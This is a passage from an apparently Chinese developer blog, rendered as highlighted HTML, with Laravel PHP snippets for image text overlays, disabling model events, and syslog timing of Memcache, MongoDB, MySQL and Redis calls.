插入到画布，left-top是距离左侧和顶部，值对应的是后面 100 100 处</span></span><br><span class="line">     $img-&gt;insert($leftImage, <span class="string">'left-top'</span>, <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">     $img-&gt;insert($rightImage, <span class="string">'right-top'</span>, <span class="number">100</span>, <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入文本，通过回调设置参数，file上传的是字体库，需要自己下载放入</span></span><br><span class="line">     $img-&gt;text(<span class="string">'王*军       320830**********542'</span>, <span class="number">1757</span>, <span class="number">1550</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$font</span>) </span>&#123;</span><br><span class="line">        $font-&gt;file(base_path().<span class="string">'/public/fzjw.ttf'</span>);</span><br><span class="line">        $font-&gt;size(<span class="number">160</span>);</span><br><span class="line">        $font-&gt;color(<span class="string">'#000'</span>);</span><br><span class="line">        $font-&gt;align(<span class="string">'center'</span>);</span><br><span class="line">        $font-&gt;valign(<span class="string">'top'</span>);</span><br><span class="line">        $font-&gt;angle(<span class="number">0</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//可以直接返回图像，也可通过$img-&gt;save()进行保存图片</span></span><br><span class="line">    <span class="keyword">return</span> $img-&gt;response(<span class="string">'jpg'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="取消事件触发"><a href="#取消事件触发" class="headerlink" title="取消事件触发"></a>取消事件触发</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取model里面的事件</span></span><br><span class="line">$dispatcher = YourModel::getEventDispatcher();</span><br><span class="line"></span><br><span class="line"><span class="comment">//禁用model里面的事件</span></span><br><span class="line">YourModel::unsetEventDispatcher();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用model的save方法</span></span><br><span class="line">$yourInstance-&gt;save();</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用事件</span></span><br><span class="line">YourModel::setEventDispatcher($dispatcher);</span><br><span class="line"><span class="comment">//Visitor model有saved事件，某些地方某些情况监听到后做一些其他操作</span></span><br><span class="line">protected $dispatchesEvents = [</span><br><span class="line">        <span class="string">'saved'</span> =&gt; VisitorSavedEvent::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">    ];</span><br><span class="line"><span class="comment">//有时候不需要触发事件，是可以取消的，可以调用model的update方法避开save()或者取消事件（推荐后者）。</span></span><br><span class="line"><span class="comment">// 获取来访信息</span></span><br><span class="line">        $visitor = Visitor::where(<span class="string">'id'</span>, $request-&gt;visitor_id)-&gt;first();</span><br><span class="line"><span class="comment">//取消事件触发https://learnku.com/articles/31490</span></span><br><span class="line">$dispatcher = Visitor::getEventDispatcher();</span><br><span class="line">Visitor::unsetEventDispatcher();</span><br><span class="line">$ret = $visitor-&gt;save();</span><br><span class="line">Visitor::setEventDispatcher($dispatcher);</span><br><span class="line"><span class="comment">//5.7</span></span><br><span class="line">YourModel::withoutEvents(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="comment">// do something...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="记录memcache-mongodb运行时间"><a href="#记录memcache-mongodb运行时间" class="headerlink" title="记录memcache mongodb运行时间"></a>记录memcache mongodb运行时间</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">cache   \vendor\laravel\framework\src\Illuminate\Cache\Repository.php</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Store $store</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">		$<span class="keyword">this</span>-&gt;store = $store;</span><br><span class="line">	&#125;</span><br><span class="line">protected <span class="function"><span class="keyword">function</span> <span class="title">fireCacheEvent</span>(<span class="params">$event, $payload</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 添加cache响应时间</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $total = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">        $payload[] = $total;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;events))</span><br><span class="line">		&#123;</span><br><span class="line">			$<span class="keyword">this</span>-&gt;events-&gt;fire(<span class="string">'cache.'</span>.$event, $payload);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params">$key, $value, $minutes</span>)</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    		$minutes = $<span class="keyword">this</span>-&gt;getMinutes($minutes);</span><br><span class="line">    </span><br><span class="line">    		<span class="keyword">if</span> ( ! is_null($minutes))</span><br><span class="line">    		&#123;</span><br><span class="line">    			$<span class="keyword">this</span>-&gt;store-&gt;put($key, $value, $minutes);</span><br><span class="line">    </span><br><span class="line">    			$<span class="keyword">this</span>-&gt;fireCacheEvent(<span class="string">'write'</span>, [$key, $value, $minutes]);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">vendor\laravel\framework\src\Illuminate\Database\Eloquent\Model.php</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">array $attributes = array(</span>))</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_time_cost_start = microtime(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;bootIfNotBooted();</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;syncOriginal();</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;fill($attributes);</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">array $options = array(</span>))</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">    	    <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;_time_cost_start = microtime(<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">  *<span class="regexp">/</span></span><br><span class="line"><span class="regexp"> 	protected function performInsert(Builder $query, array $options = [])</span></span><br><span class="line"><span class="regexp"> 	&#123;</span></span><br><span class="line"><span class="regexp"> 		if ($this-&gt;fireModelEvent('creating') === false) return false;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> 		if ($this-&gt;timestamps &amp;&amp; array_get($options, 'timestamps', true))</span></span><br><span class="line"><span class="regexp"> 		&#123;</span></span><br><span class="line"><span class="regexp"> 			$this-&gt;updateTimestamps();</span></span><br><span class="line"><span class="regexp"> 		&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> 		$attributes = $this-&gt;attributes;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">         $conn = $query-&gt;getModel()-&gt;connection;</span></span><br><span class="line"><span class="regexp">         if($conn == "mongodb") &#123;</span></span><br><span class="line"><span class="regexp">             unset($attributes['_time_cost_start']);</span></span><br><span class="line"><span class="regexp">             unset($attributes['_time_cost_total']);</span></span><br><span class="line"><span class="regexp">         &#125;</span></span><br><span class="line"><span class="regexp">protected function fireModelEvent($event, $halt = true)</span></span><br><span class="line"><span class="regexp">	&#123;</span></span><br><span class="line"><span class="regexp">		if ( ! isset(static::$dispatcher)) return true;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">        /</span>**</span><br><span class="line">         * 将监听事件类名去掉，去掉<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">         * 添加<span class="title">mongodb</span>响应时间</span></span><br><span class="line"><span class="class">         */</span></span><br><span class="line"><span class="class">		//$<span class="title">event</span> </span>= <span class="string">"eloquent.&#123;$event&#125;: "</span>.get_class($<span class="keyword">this</span>);</span><br><span class="line">        $event = <span class="string">"eloquent.&#123;$event&#125;"</span>;</span><br><span class="line">		$method = $halt ? <span class="string">'until'</span> : <span class="string">'fire'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_time_cost_total = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;_time_cost_start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::$dispatcher-&gt;$method($event, $<span class="keyword">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Mysql event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'illuminate.query'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$sql, $binds, $time,$name</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::HandleMysqlSysLog($sql, $binds, $time, $name, $app);</span><br><span class="line">           &#125;);</span><br><span class="line">   </span><br><span class="line">           <span class="comment">//MongoDB event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'eloquent.saved'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$model</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MongodbSysLog(<span class="string">'saved'</span>, $app, $model);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'eloquent.deleted'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$model</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MongodbSysLog(<span class="string">'deleted'</span>, $app, $model);</span><br><span class="line">           &#125;);</span><br><span class="line">   </span><br><span class="line">           <span class="comment">//Memcache event handle</span></span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.write'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $value, $time, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'put'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.delete'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'delete'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.hit'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $value, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'get'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           $app[<span class="string">'events'</span>]-&gt;listen(<span class="string">'cache.missed'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">$key, $total</span>) <span class="title">use</span> (<span class="params">$app</span>)</span>&#123;</span><br><span class="line">               self::MemcacheSysLog(<span class="string">'missed'</span>,$key,$total);</span><br><span class="line">           &#125;);</span><br><span class="line">           </span><br><span class="line">  public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MysqlSysLog</span>(<span class="params">$sql, $binds, $time, $name, $app</span>)</span>&#123;</span><br><span class="line">          foreach ($binds <span class="keyword">as</span> $bind) &#123;</span><br><span class="line">              $sql = preg_replace(<span class="string">'/\?/'</span>, <span class="string">'\''</span> . $bind . <span class="string">'\''</span>, $sql, <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//调用select时先判断使用读库还是写库，而insert/update/delete统一使用写库 Illuminate/Database/Connectors/ConnectionFactory.php Illuminate/Database/Connection.php</span></span><br><span class="line">          $connection = $app[<span class="string">'db'</span>]-&gt;getconnections();</span><br><span class="line">          <span class="keyword">if</span> ($name) &#123;</span><br><span class="line">              <span class="keyword">if</span> (preg_match(<span class="string">'#^select[\s\S]*$#'</span>, $sql, $match)) &#123;</span><br><span class="line">                  $pdo = $connection[$name]-&gt;getreadPdo();</span><br><span class="line">                  $host = explode(<span class="string">' '</span>, $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[<span class="number">0</span>]; </span><br><span class="line">                  $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  $pdo = $connection[$name]-&gt;getpdo();</span><br><span class="line">                  $host = explode(<span class="string">' '</span>, $pdo-&gt;getAttribute(\PDO::ATTR_CONNECTION_STATUS))[<span class="number">0</span>];</span><br><span class="line">                  $server_info = $pdo-&gt;getAttribute(\PDO::ATTR_SERVER_INFO);</span><br><span class="line">              &#125;</span><br><span class="line">  </span><br><span class="line">              $data = [</span><br><span class="line">                  <span class="string">'rs'</span> =&gt; <span class="string">'mysql://'</span> . $host.<span class="string">':'</span>.$connection[$name]-&gt;getconfig(<span class="string">'port'</span>) . <span class="string">'/'</span> . $connection[$name]-&gt;getconfig(<span class="string">'name'</span>),</span><br><span class="line">                   <span class="string">'cmd'</span> =&gt; $sql,</span><br><span class="line">                  <span class="string">'output_content'</span> =&gt; [</span><br><span class="line">                      <span class="string">'database'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'database'</span>),</span><br><span class="line">                      <span class="string">'host'</span> =&gt; $host,</span><br><span class="line">                      <span class="string">'name'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'name'</span>),</span><br><span class="line">                      <span class="string">'port'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'port'</span>),</span><br><span class="line">                      <span class="string">'driver'</span> =&gt; $connection[$name]-&gt;getconfig(<span class="string">'driver'</span>),</span><br><span class="line">                      <span class="string">'server_info'</span> =&gt; $server_info</span><br><span class="line">                  ],</span><br><span class="line">                  <span class="string">'t_total'</span> =&gt; $time</span><br><span class="line">              ]; </span><br><span class="line">              self::SaveSysLog($data);</span><br><span class="line">          &#125; </span><br><span class="line">      &#125;         </span><br><span class="line">      public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MemcacheSysLog</span>(<span class="params">$cmd, $key, $total</span>)</span>&#123;</span><br><span class="line">              <span class="keyword">if</span>(app(<span class="string">'cache'</span>)-&gt;getStore() <span class="keyword">instanceof</span> \Illuminate\Cache\MemcachedStore)&#123;</span><br><span class="line">                  $servers = implode(<span class="string">'/'</span>, array_keys(app(<span class="string">'cache'</span>)-&gt;getMemcached()-&gt;getStats()));</span><br><span class="line">                  $data = [</span><br><span class="line">                      <span class="string">'rs'</span> =&gt; <span class="string">'mc://'</span> . $servers,</span><br><span class="line">                       <span class="string">'cmd'</span> =&gt; $cmd . <span class="string">' '</span> . $key,</span><br><span class="line">                      <span class="string">'t_total'</span> =&gt; $total,</span><br><span class="line">                      <span class="string">'code'</span> =&gt; <span class="number">0</span></span><br><span class="line">                  ];</span><br><span class="line">              &#125;  </span><br><span class="line">       self::SaveSysLog($data);</span><br><span class="line">           &#125;     </span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">MongodbSysLog</span>(<span class="params">$cmd, $app, $model</span>)</span>&#123;</span><br><span class="line">            $connection = $app[<span class="string">'db'</span>]-&gt;getconnections();</span><br><span class="line">            <span class="keyword">if</span>(isset($connection[<span class="string">'mongodb'</span>])) &#123;</span><br><span class="line">                $data = [</span><br><span class="line">                    <span class="string">'rs'</span> =&gt; <span class="string">'Mongo://'</span> . $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'host'</span>) . <span class="string">':'</span> . $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'port'</span>) ,</span><br><span class="line">                     <span class="string">'cmd'</span> =&gt; $cmd,</span><br><span class="line">                    <span class="string">'output_content'</span> =&gt; [</span><br><span class="line">                        <span class="string">'database'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'database'</span>),</span><br><span class="line">                        <span class="string">'host'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'host'</span>),</span><br><span class="line">                        <span class="string">'port'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'port'</span>),</span><br><span class="line">                        <span class="string">'driver'</span> =&gt; $connection[<span class="string">'mongodb'</span>]-&gt;getconfig(<span class="string">'driver'</span>)</span><br><span class="line">                    ],</span><br><span class="line">                    <span class="string">'t_total'</span> =&gt; $model-&gt;_time_cost_total,</span><br><span class="line">                    <span class="string">'rs_content'</span> =&gt; $model-&gt;toArray()[<span class="string">'_id'</span>]</span><br><span class="line">                ];</span><br><span class="line">            &#125;  </span><br><span class="line">            </span><br><span class="line">            self::SaveSysLog($data);</span><br><span class="line">        &#125;   </span><br><span class="line">        public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">SaveSysLog</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(php_sapi_name()==<span class="string">'cli'</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                 openlog(<span class="string">'app'</span>,LOG_PID|LOG_ODELAY,LOG_LOCAL6);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    syslog(LOG_INFO,json_encode($data));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">                    \Log::info(<span class="string">'syslog_error'</span>, [<span class="string">'data'</span> =&gt; $data]);</span><br><span class="line">                &#125;</span><br><span class="line">                closelog();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">vendor/laravel/framework/src/Illuminate/Cache/MemcachedStore.php:<span class="number">164</span>            </span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">		$value = $<span class="keyword">this</span>-&gt;memcached-&gt;get($<span class="keyword">this</span>-&gt;prefix.$key);</span><br><span class="line">        <span class="comment">//$total = round((microtime(true) - $this-&gt;start) * 1000, 2);</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;end = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;handleMcSysLog(<span class="string">'get'</span>, $key);</span><br><span class="line">		<span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;memcached-&gt;getResultCode() == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> $value;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;            </span><br><span class="line">            </span><br><span class="line">     private <span class="function"><span class="keyword">function</span> <span class="title">handleMcSysLog</span>(<span class="params">$cmd, $key</span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             $total = round(($<span class="keyword">this</span>-&gt;end - $<span class="keyword">this</span>-&gt;start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">             $rs = implode(<span class="string">'/'</span>, array_keys($<span class="keyword">this</span>-&gt;memcached-&gt;getStats()));</span><br><span class="line">             $data = [</span><br><span class="line">                 <span class="string">'rs'</span> =&gt; <span class="string">'mc://'</span> . $rs,</span><br><span class="line">                 <span class="string">'rs_type'</span> =&gt; <span class="number">6</span>,</span><br><span class="line">                 <span class="string">'cmd'</span> =&gt; $cmd . <span class="string">' '</span> . $key,</span><br><span class="line">                 <span class="string">'t_total'</span> =&gt; $total,</span><br><span class="line">                 <span class="string">'code'</span> =&gt; $<span class="keyword">this</span>-&gt;memcached-&gt;getLastErrorCode(),</span><br><span class="line">                 <span class="string">'ext'</span> =&gt; $<span class="keyword">this</span>-&gt;memcached-&gt;getLastErrorMessage()</span><br><span class="line">             ];</span><br><span class="line">             </span><br><span class="line">     </span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
<h3 id="记录Redis运行时间"><a href="#记录Redis运行时间" class="headerlink" title="记录Redis运行时间"></a>记录Redis运行时间</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">predis</span><br><span class="line"></span><br><span class="line">use \Predis\Command\CommandInterface;</span><br><span class="line">use \Predis\Connection\StreamConnection;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLog</span> <span class="keyword">extends</span> <span class="title">StreamConnection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $tstart = <span class="number">0</span>;</span><br><span class="line">    private $debugBuffer = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;tstart = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        parent::connect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">storeDebug</span>(<span class="params">CommandInterface $command, $direction</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $firtsArg = $command-&gt;getArguments();</span><br><span class="line">        $timestamp = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;tstart) * <span class="number">1000</span>,<span class="number">2</span>);</span><br><span class="line">        $log = [];</span><br><span class="line">        $log[<span class="string">'cmd'</span>] = $command-&gt;getId();</span><br><span class="line">        $log[<span 